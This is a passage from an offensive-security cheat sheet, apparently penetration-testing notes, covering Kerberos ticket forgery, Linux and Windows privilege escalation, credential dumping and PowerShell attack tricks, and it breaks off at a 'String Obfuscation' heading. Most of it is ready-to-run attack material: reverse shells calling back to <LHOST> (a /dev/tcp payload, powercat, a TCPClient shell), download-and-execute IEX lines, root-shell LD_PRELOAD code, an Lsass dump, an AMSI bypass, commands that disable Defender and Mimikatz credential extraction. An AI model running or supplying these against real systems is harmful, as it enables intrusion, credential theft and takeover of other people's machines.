mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Inject TGS with Mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

##3## Rubeus Examples

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

#### Golden Ticket

##### Impacket Examples

###### Generate TGT with NTLM

```c
$ python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Generate TGT with aesKey

```c
$ python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Set TGT for Impacket Usage

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGT with NTLM

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```

###### Generate TGT with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```

###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```

###### Inject TGT with Mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

###### Inject Ticket with Rubeus

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

###### Get NTLM from Password

```c
$ python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

## Kiosk Breakout

### Using Microsoft Edge

> https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/

```c
<script>
    function shlExec() {
        var cmd = document.getElementById('cmd').value
        var shell = new ActiveXObject("WScript.Shell");
        try {
            var execOut = shell.Exec("cmd.exe /C \"" + cmd + "\"");
        } catch (e) {
            console.log(e);
        }
 
        var cmdStdOut = execOut.StdOut;
        var out = cmdStdOut.ReadAll();
        alert(out);
    }
</script>
 
<form onsubmit="shlExec()">
    Command: <input id="cmd" name="cmd" type="text">
    <input type="submit">
</form> 
```

Copy a `cmd.exe` binary to the download directory of the default user `KioskUser0`.

```c
copy C:\Windows\System32\cmd.exe C:\Users\KioskUser0\Downloads\msedge.exe
```

## Krbrelayx

> https://github.com/dirkjanm/krbrelayx

### Abuse DNS Delegation Zones with dnstool.py

```c
$ python3 dnstool.py -u 'domain\<USERNAME>' -p '<PASSWORD>' -a add -r '<TO_ABUSE>.<DOMAIN>' -d <LHOST> <RHOST>
```

## LAPS

```c
PS C:\Users\<USERNAME>\Documents> $Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
PS C:\Users\<USERNAME>\Documents> $Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-Adm-PwdExpirationTime
```

## LDAP

> https://github.com/infosecn1nja/AD-Attack-Defense

> https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/

> https://adsecurity.org/?p=2288

### Queries

```c
$ (New-Object adsisearcher((New-Object adsi("LDAP://dc.<DOMAIN>.local","<DOMAIN>\<USERNAME>","<PASSWORD>")),"(objectCategory=Computer)")).FindAll() | %{ $_.Properties.name }
$ (New-Object adsisearcher((New-Object adsi("LDAP://dc.<DOMAIN>.local","<DOMAIN>\<USERNAME>","<PASSWORD>")),"(info=*)")).FindAll() | %{ $_.Properties }
```

## ldapmodify

```c
$ ldapmodify -x -H ldap://<RHOST> -d 1 -D CN=<USERNAME>,CN=<GROUP>,DC=<DOMAIN>,DC=local -W <<EOF
dn: CN=<USERNAME>,OU=<GROUP>,DC=<DOMAIN>,DC=local
changetype: modify
replace: unicodePwd
unicodePwd::UABhACQAJAB3ADAAcgBkAA==
EOF
```

## ldapsearch

```c
$ ldapsearch -x -h <RHOST> -s base namingcontexts
$ ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
$ ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +
$ ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
$ ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
$ ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
$ ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "dc=<DOMAIN>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
$ ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
```

### Handle Kerberos Authentication

```c
$ LDAPTLS_REQCERT=never ldapsearch -x -W -D "<USERNAME>@<DOMAIN>" -b "dc=<DOMAIN>,dc=local" -H ldaps://<RHOST> "samaccountname=*"
```

## LD_PRELOAD

> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

or

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

### Compiling

```c
$ gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles 
```

### Privilege Escalation

```c
$ sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
```

## LD_LIBRARY_PATH

### Get Information about Libraries

```c
$ ldd /PATH/TO/BINARY/<BINARY>
```

### shell.c

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

### Compiling

```c
$ gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
```

### Privilege Escalation

```c
$ sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
```

## Libre Office

### Enable Macros via Registry

> https://admx.help/?Category=LibreOffice-from-Collabora&Policy=Collabora.Policies.LibreOffice::MacroSecurityLevel

```c
C:\> Set-ItemProperty -Path "HKLM:\Software\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0
```

## Linux

### adduser.sh

```c
#!/bin/bash
echo '<USERNAME>:BP9vDdYHNP.Mk:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### capsh

```c
$ capsh --print
```

## Linux Wildcards

> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
Instead of an option, it creates a file, named `--checkpoint=1`.

```c
$ touch -- --checkpoint=1
```

or

```c
$ touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```c
$ touch -- '--checkpoint-action=exec=sh shell.sh'
```

or 

```c
$ touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```c
$ rm ./'--checkpoint-action=exec=python script.sh'
```

## logrotten

> https://github.com/whotwagner/logrotten

### Skeleton Payload

```c
if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```

### Syntax

#### If "create"-option is set in logrotate.cfg

```c
$ ./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

#### If "compress"-option is set in logrotate.cfg

```c
$ ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

## Lsass

### Dump

```c
C:\> tasklist
C:\> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
```

## Lua

### Code Execution

```c
file = io.open("/root/.ssh/authorized_keys", "w")
file:write("ssh-rsa AAAAB3N--- snip ---YM5syQ==")
file:close()
```

## machinectl

```c
$ machinectl shell --uid=root
```

## Microsoft Windows

### Common Commands

```c
C:\> tree /f C:\Users\
C:\> tasklist /SVC
C:\> sc query
C:\> sc qc <SERVICE>
C:\> netsh firewall show state
C:\> schtasks /query /fo LIST /v
C:\> findstr /si password *.xml *.ini *.txt
C:\> dir /s *pass* == *cred* == *vnc* == *.config*
C:\> accesschk.exe -uws "Everyone" "C:\Program Files"
C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

### User Enumeration

```c
C:\> net user
C:\> net user /domain
C:\> dir C:\Users
C:\> cmd.exe /c echo %username%
PS C:\> echo $env:username
```

### Adding Users to Groups

```c
C:\> net user <USERNAME> <PASSWORD> /add /domain
C:\> net group "Exchange Windows Permissions" /add <USERNAME>
C:\> net localgroup "Remote Management Users" /add <USERNAME>
```

### Show Hidden Files and Folders

```c
C:\> dir /a      // show hidden folders
C:\> dir /a:d    // show all hidden directories
C:\> dir /a:h    // show all hidden files
PS C:\> cmd /c dir /A      // show hidden folders
PS C:\> cmd /c dir /A:D    // show all hidden directories
PS C:\> cmd /c dir /A:H    // show all hidden files
```

### Enable WinRM

```c
C:\> winrm quickconfig
```

### Enable Remote Desktop (RDP)

```c
C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\> netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

or

```c
PS C:\> Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
PS C:\> Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
PS C:\> Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
```

### Firewall Handling

#### Common Commands

```c
PS C:\> get-netfirewallrule -all
PS C:\> get-netfirewallrule -policystore configurableservicestore -all
PS C:\> New-NetFirewallRule -DisplayName '<NAME>' -Profile 'Private' -Direction Inbound -Action Allow -Protocol TCP -LocalPort <LPORT>
PS C:\> New-NetFirewallRule -DisplayName '<NAME>' -Profile 'Private' -Direction Inbound -Action Deny -Protocol TCP -LocalPort <LPORT>
PS C:\> Enable-NetFirewallRule -DisplayName "<NAME>"
PS C:\> Disable-NetFirewallRule -DisplayName "<NAME>"
```

#### Allow all outgoing Traffic

```c
PS C:\> New-NetFirewallRule -DisplayName "Allow all outbound traffic" -Direction Outbound -Action Allow
PS C:\> Enable-NetFirewallRule -DisplayName "Allow all outbound traffic"
```

### Port Forwarding

#### Check Port Forwardings

```c
C:\> netsh interface portproxy show all
```

#### Set Port Forwarding

```c
C:\> netsh interface portproxy add v4tov4 listenport=<RPORT> listenaddress=<RHOST> connectport=8443 connectaddress=<LHOST>
```

#### Create Port Forwarding Firewall Rule

```c
C:\> advfirewall firewall add rule name="<NAME>" protocol=TCP dir=in localip=<RHOST> localport=<RPORT> action=allow
```

#### Delete specific Forwarding

```c
C:\> netsh interface portproxy delete v4tov4 listenport=80 listenaddress=127.0.0.1
```

#### Remove all existing Forwardings

```c
C:\> netsh interface portproxy reset
```

### Hashes

> https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

> https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

- LM Hashes are deprecated and so there are replaced by an empty string (aad3b435b51404eeaad3b435b51404ee).
- If a `Hash` starts with `31d6`, chances are pretty good, that there is no `Password`
set for the user.

#### LM

- `Oldest` password storage used by `Microsoft Windows`
- If available, they can be obtained from `SAM` databases on a `Microsoft Windows` system or from the `NTDS` database of a `Domain Controller`
- When dumping `SAM/NTDS` databases, they are shown together within the `NTHash` before the colon
- Can be used for `Pass-The-Hash`

##### Example

```c
299BD128C1101FD6
```

##### Algorithm

1. Convert all `lower case` to `upper case`
2. Pad password to `14` characters with NULL characters
3. Split the password to two `7` character chunks
4. Create two `DES` keys from each `7` character chunk
5. DES `encrypt` the string "KGS!@#$%" with these two `chunks`
6. `Concatenate` the two DES encrypted strings. This is the LM hash.

##### Cracking

```c
$ john --format=lm <FILE>
$ hashcat -m 3000 -a 3 <FILE>
```

#### NTHash (NTLM)

- The way how passwords are stored on `modern` `Microsoft Windows` systems
- Can be optained by dumping the `SAM` database or using `mimikatz`
- They are also stored in the `NTDS` file on `Domain Cotnrollers`
- Can be used for `Pass-The-Hash`

##### Example

```c
B4B9B02E6F09A9BD760F388B67351E2B
```

##### Algorithm

```c
MD4(UTF-16-LE(password))
```

##### Cracking

```c
$ john --format=nt <FILE>
$ hashcat -m 1000 -a 3 <FILE>
```

#### Net-NTLMv1 (NTLMv1)

- `NTLM` protocol uses the `NTHash` in `Challenge-Response` between a `server` and a `client`
- The `v1` of the protocol uses both, the `NT` hash and the `LM` hash, depending on configuration and what is available.
- Can be obtained by using `Responder`
- Values for cracking are `K1`, `K2` or `K3` from the algorithm
- Version 1 is `deprecated` but still used in some old systems on the network
- Can be used for `Relaying`

##### Example

```c
u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

##### Algorithm

```c
C = 8-byte server challenge, random
K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
response = DES(K1,C) | DES(K2,C) | DES(K3,C)
```

##### Cracking

```c
$ john --format=netntlm <FILE>
$ hashcat -m 5500 -a 3 <FILE>
```

#### Net-NTLMv2 (NTLMv2)

- New and improved version of the `NTLM` protocol
- Harder to crack
- Same concept as `NTLMv1`, only with a different algorithm and response sent to the server
- Can also be captured by using `Responder`
- Default in Microsoft Windows since `Microsoft Windows 2000`
- Can be used for `Relaying`

##### Example

```c
admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
```

##### Algorithm

```c
SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
```

##### Cracking

```c
$ john --format=netntlmv2 <FILE>
$ hashcat -m 5600 -a 3 <FILE>
```

### Privileges and Permissions

#### AlwaysInstallElevated

```c
C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
C:\> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```c
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
```

```c
C:\> msiexec /quiet /qn /i <FILE>.msi
```

### Registry Handling

#### Enable Colored Output

```c
C:\> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Then open a new Terminal Window.

#### Check for Auto Run Programs

```c
C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Get Registry Key Information

```c
C:\> req query <REGISTRY_KEY>
```

#### Modify Registry Key

```c
C:\> reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
```

#### Search the Registry for Passwords

```c
C:\> req query HKLM /f password /t REG_SZ /s
C:\> req query HKCU /f password /t REG_SZ /s
```

### Searching for Credentials

#### Unattended Windows Installations

##### Potential Files containing Passwords

```c
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

#### Search for Passwords

```c
C:\> dir .s *pass* == *.config
C:\> findstr /si password *.xml *.ini *.txt
PS:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
PS:\> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
PS:\> Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
```

#### PowerShell History

```c
C:\> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Saved Windows Credentials

```c
C:\> cmdkey /list
C:\> runas /savecred /user:<USERNAME> cmd.exe
```

#### Windows Registry

```c
C:\> reg query HKLM /f password /t REG_SZ /s
C:\> reg query HKCU /f password /t REG_SZ /s
```

#### IIS Configuration

```c
C:\> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

#### PuTTY

```c
C:\> reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
```

### Service Handling

```c
C:\> sc.exe create <SERVICE>
C:\> sc start <SERVICE>
C:\> sc qc <SERVICE>
```

### Tasks & Services

#### Scheduled Tasks

```c
C:\> schtasks
C:\> schtasks /query /tn <TASK> /fo list /v
C:\> schtasks /run /tn <TASK>
PS C:\> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

#### Unquoted Service Paths

Search for `Unquoted Service Paths` by using `sc qc`.

```c
C:\> sc qc
C:\> sc qc WindowsScheduler
C:\> sc stop WindowsScheduler
C:\> sc start WindowsScheduler
```

```c
C:\> icacls <PROGRAM>.exe
C:\> icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
C:\> icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
```

#### Insecure Service Permissions

```c
C:\> accesschk64.exe -qlc <SERVICE>
C:\> icacls C:\Users\<USERNAME>\<FILE>.exe /grant Everyone:F
C:\> sc config <SERVICE> binPath= "C:\Users\<USERNAME>\<FILE>.exe" obj= LocalSystem
C:\> sc stop <SERVICE>
C:\> sc start <SERVICE>
```

#### SeBackup and SeRestore Privilege

##### Backup SAM and SYSTEM Hashes

```c
C:\> reg save hklm\system C:\Users\<USERNAME>\system.hive
C:\> reg save hklm\sam C:\Users\<USERNAME>\sam.hive
```

##### Dumping Hashes

```c
$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

##### Pass the Hash

```c
$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<RHOST>
```

#### SeTakeOwnership Privilege

```c
C:\> takeown /f C:\Windows\System32\Utilman.exe
```

```c
C:\> icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```

```c
C:\Windows\System32\> copy cmd.exe utilman.exe
```

Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.

#### SeImpersonate and SeAssignPrimaryToken Privilege

> https://github.com/antonioCoco/RogueWinRM

```c
C:\> .\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
```

### WMIC

```c
C:\> wmic product get name,version,vendor
```

## Microsoft Windows Defender

### Check Whitelisted Paths

```c
PS C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

### Malicious Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

## Minimalistic Offensive Security Tools

> https://github.com/InfosecMatter/Minimalistic-offensive-security-tools

### port-scan-tcp.ps1

```c
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<RHOST>/port-scan-tcp.ps1')
```

## nginx

### ngx_http_dav_module Privilege Escalation

> https://nginx.org/en/docs/http/ngx_http_dav_module.html

```c
$ cat << EOF> /tmp/<FILE>.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;events {
worker_connections 768;
}
http {
server {
listen 9001;
root /;
autoindex on;
dav_methods PUT;
}
}
EOF
```

```c
$ sudo nginx -c /tmp/<FILE>.conf
```

```c
$ curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat <SSH_KEY>.pub)"
```

## PassTheCert

> https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

> https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

```c
$ certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
$ certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
$ python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
$ evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
```

## Path Variable Hijacking

### Finding accessible SUID Files

```c
$ find / -perm -u=s -type f 2>/dev/null
```

### Find writeable Paths

```c
$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

### Add current Directory

```c
$ export PATH=$(pwd):$PATH
```

### Binary File

```c
$ cd /tmp
$ vi <FILE>
$ chmod +x ./<FILE>
$ PATH=$(pwd):$PATH <SUID_FILE>
```

## Perl

### Environment Variable Arbitrary Code Execution

> https://www.elttam.com/blog/env/#content

```c
$ sudo PERL5OPT=-d PERL5DB='system("chmod u+s /bin/bash");' exit;
```

## PHP7.2

```c
$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

## pika

### Remote Code Execution (RCE)

```c
#!/usr/bin/env python

import pika

credentials = pika.PlainCredentials('<USERNAME>', '<PASSWORD>')
parameters = pika.ConnectionParameters('<LHOST>',5672,'/',credentials)
connection = pika.BlockingConnection(parameters)
channel = connection.channel()
channel.basic_publish(exchange='', routing_key='plugin_data', body='http://127.0.0.1:9001/<SCRIPT>')
connection.close()
```

## Ping Sweep

### On a Linux Operating System

```c
$ for ip in {1..254}; do (ping -c 1 <XXX.XXX.XXX>.${ip} | grep "bytes from" | grep -v "Unreachable" &); done;
```

### On a Windows Operating System

```c
PS C:\> 1..255 | ForEach-Object { $ip = "<XXX.XXX.XXX>.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip } }
```

### With Meterpreter

```c
meterpreter > (for /L %a IN (1,1,254) DO ping /n 1 /w 1 <XXX.XXX.XXX>.%a) | find "Reply"
```

## PKINITtools

```c
$ python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
$ export KRB5CCNAME=<USERNAME>.ccache
$ python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
```

## plotting

Exploit race condition on linux by swapping file paths between 2 files very quickly (normal file, symlink to root owned file, swap, swap ,swap).

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

## Port Scanning

### On a Linux Operating System

```c
$ nc -zv 127.0.0.1 1-65535 | grep succeeded
```

```c
$ for port in {1..65535}; do echo > /dev/tcp/<RHOST>/$port && echo "$port open"; done 2>/dev/null
```

### On a Windows Operating System

```c
PS C:\> 1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<RHOST>",$_)) "$_ port open"} 2>$null
```

## PoshADCS

>  https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1

```c
PS C:\> curl http://<LHOST>/ADCS.ps1 | iex
PS C:\> Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose
PS C:\> gci cert:\currentuser\my -recurse
```

## powercat

> https://github.com/besimorhino/powercat

```c
PS C:\> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
```

### File Transfer

```c
$ impacket-smbserver local . -smb2support
```

```c
PS C:\> Import-Module .\powercat.ps1
PS C:\> powercat -c <LHOST> -p 445 -i C:\PATH\TO\FILE\<FILE>
```

## Powermad

```c
PS C:\> Import-Module ./Powermad.ps1
PS C:\> $secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
PS C:\> New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
```

## PowerShell

> https://redteamrecipe.com/powershell-tips-tricks/?s=09

### Enumerating System Information

```c
PS C:\> Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
```

### Extracting Network Configuration

```c
PS C:\> Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNServer
```

### Listing Running Processes with Details

```c
PS C:\> Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending
```

### Accessing Event Logs for Anomalies

```c
PS C:\> Get-EventLog -LogName Security | Where-Object {$_.EntryType -eq 'FailureAudit'}
```

### Scanning for Open Ports

```c
PS C:\> 1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async = $sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false); if($sock.Connected) { $_ } ; $sock.Close() }
```

### Retrieving Stored Credentials

```c
PS C:\> $cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password
```

### Executing Remote Commands

```c
PS C:\> Invoke-Command -ComputerName TargetPC -ScriptBlock { Get-Process } -Credential (Get-Credential)
```

### Downloading and Executing Scripts from URL

```c
PS C:\> $url = 'http://<LHOST>/<FILE>.ps1'; Invoke-Expression (New-Object Net.WebClient).DownloadString($url)
```

### Bypassing Execution Policy for Script Execution

```c
PS C:\> Set-ExecutionPolicy Bypass -Scope Process -Force; .\<FILE>.ps1
```

### Enumerating Domain Users

```c
PS C:\> Get-ADUser -Filter * -Properties * | Select-Object -Property Name, Enabled, LastLogonDate
```

### Capturing Keystrokes

```c
PS C:\> $path = 'C:\<FILE>.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path
```

### Extracting Wi-Fi Profiles and Passwords

```c
PS C:\> netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }
```

### Monitoring File System Changes

```c
PS C:\> $watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }
```

### Creating Reverse Shell

```c
PS C:\> $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = PS C:\> $client.GetStream(); [byte[]]$bytes = 0..65535...
```

### Disabling Windows Defender

```c
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
```

### Extracting Browser Saved Passwords

```c
PS C:\> Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\<FILE>.txt
```

### Conducting Network Sniffing

```c
PS C:\> $adapter = Get-NetAdapter | Select-Object -First 1; New-NetEventSession -Name '<NAME>' -CaptureMode SaveToFile -LocalFilePath 'C:\<FILE>.etl'; Add-NetEventPacketCaptureProvider -SessionName '<NAME>' -Level 4 -CaptureType Both -Enable; Start-NetEventSession -Name '<NAME>'; Stop-NetEventSession -Name '<NAME>' after 60
```

### Bypassing AMSI (Anti-Malware Scan Interface)

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Extracting System Secrets with Mimikatz

```c
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\<FILE>.txt
```

### String Obfuscation

```c
